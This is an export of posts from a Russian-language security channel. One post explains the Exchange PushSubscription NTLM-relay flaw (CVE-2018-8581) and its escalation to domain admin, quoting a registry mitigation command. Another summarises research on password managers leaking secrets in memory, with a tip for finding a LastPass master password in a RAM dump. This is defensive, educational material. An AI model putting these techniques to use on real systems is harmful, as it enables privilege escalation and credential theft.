<a href="" onclick="return ShowHashtag(&quot;exchange&quot;)">#exchange</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Подстава от Exchange</strong><br><br>В последнее время обсуждается непотребное поведение Exchange: при отправке push-уведомлений (функция PushSubscription) он использует свою привилегированную учетку, потому что в функции BeginSendNotification:<br><br><code>notificationServiceClient.Credentials = CredentialCache.DefaultCredentials;</code><br><br>где CredentialCache.DefaultCredentials выполняется от имени NT AUTHORITY\SYSTEM.<br><br>Отправлять push-уведомления можно на любой HTTP-сервер, какой пожелает настроить авторизованный пользователь Exchange. Ну и дальше NTLM-relay с правами сервера Exchange.<br><br>Один из вариантов реализации атаки предполагает получение прав любого пользователя Exchange на самом сервере, подробно описан тут: <a href="https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange">https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange</a>, и прилагаются эксплойты, по умолчанию создающие правило перенаправления входящих жертвы на ящик атакующего. От этой атаки (CVE-2018-8581) Microsoft выпустила очумительную рекомендацию по защите:<br><br><code>reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableLoopbackCheck /f</code><br><br>Это спасает только от релея на исходный сервер.<br><br>Другой вариант атаки использует релей на другие хосты (DC в частности) и основан на обычно высоких привилегиях Exchange в домене, в том числе наличии прав на операции DCSync. Описание атаки с нюансами: <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a>. Прилагается скрипт для провокации Exchange на аутентификацию, а также скрипт для двойного релея, чтобы еще и креды для ящика не нужны были.
       </div>

      </div>

     </div>

     <div class="message service" id="message-222">

      <div class="body details">
7 March 2019
      </div>

     </div>

     <div class="message default clearfix" id="message241">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.03.2019 11:13:32">
11:13
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;пароли&quot;)">#пароли</a><br><br><strong>Как выбрать и правильно использовать менеджер паролей</strong><br><br>...и перестать уже хранить пароли в txt и doc взломщикам на радость.<br><br>Ребятки из Independent Security Evaluators запилили опупенно интересную статью о безопасности различных менеджерей паролей. Исследование включало 1Password7, 1Password4, Dashlane, KeePass и LastPass. В результате оказалось, что с защитой данных, когда приложение не запущено, все менеджеры справляются хорошо. А вот когда приложение запущено, в том числе когда база паролей была уже заблокирована после использования (состояние locked), степень реализуемой защиты колеблется от не очень хорошей до очень плохой.<br><br><strong>1Password7 (7.2.576)</strong><br>При введении мастер-пароля расшифровывает сразу все пароли из базы и сохраняет их в оперативной памяти. Также хранит в оперативной памяти в открытом виде мастер-пароль и дополнительный секретный ключ. Все это не удаляется и остается в памяти при переводе в заблокированное состояние.<br><br><strong>1Password4 (4.6.2.626)</strong><br>Хотя это устаревшая версия, ее защита лучше. Она расшифровывает пароли по одному и сохраняет в памяти в открытом виде только те, к которым было обращение. При блокировке эта память освобождается, но не затирается сразу. А вот мастер-пароль хранится в памяти как в разблокированном, так и в заблокированном состоянии, почти в открытом виде - для декодирования необходимо запутстить две функции RtlRunEncodeUnicodeString и RtlRunDecodeUnicodeString.<br><br><strong>Dashlane (6.1843.0)</strong><br>Этот менеджер имеет важную отличительную особенность - при закрытии приложения стандартными методами (нажатие на [x], Alt+F4) он не закрывается (как это делают остальные), а сворачивается в трей.<br>Dashlane хранит в памяти расшифрованной только последнюю запись, к которой обращался пользователь. Но если пользователь что-то редактировал, то расшифровывается и помещается в память вся база. В обоих случаях расшифрованные данные остаются в памяти и после блокировки - на некоторое время - память освобождается, но не затирается.<br><br><strong>KeePass (2.40)</strong><br>Расшифровывает и сохраняет в памяти записи по мере обращения к ним. После блокировки эти записи остаются в памяти в открытом виде.<br><br><strong>LastPass (4.1.59)</strong><br>Расшифровывает пароли по одному при обращении к ним, но не удаляет эти пароли из памяти при переходе в заблокированное состояние. Мастер-пароль затирает сразу после выработки ключей фразой &apos;lastpass rocks&apos;, но во время выработки ключей мастер-пароль сохраняется в другом буфере в оперативной памяти в открытом виде и так и остается там. Фразу &apos;lastpass rocks&apos; можно использовать для его легкого поиска после применения strings к дампу памяти - он будет рядом в пределах нескольких строк =)<br><br>Так что любой менеджер лучше выключать, а не блокировать. А некоторые еще и мастер-пароль могут спалить.<br><br>Источник (с красивыми картинками, примерами, ссылками на материалы, да и вообще читается приятно): <a href="https://www.securityevaluators.com/casestudies/password-manager-hacking/">https://www.securityevaluators.com/casestudies/password-manager-hacking/</a>
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message242">

      <div class="body">

       <div class="pull_right date details" title="07.03.2019 11:13:43">
11:13
       </div>

       <div class="media_wrap clearfix">

        <a class="photo_wrap clearfix pull_left" href="photos/photo_4@07-03-2019_11-13-43.jpg">

         <img class="photo" src="photos/photo_4@07-03-2019_11-13-43_thumb.jpg" style="width: 230px; height: 70px"/>

        </a>

       </div>

       <div class="text">
если коротко и наглядно
       </div>

      </div>

     </div>

    </div>

   </div>

  </div>

 </body>

</html>
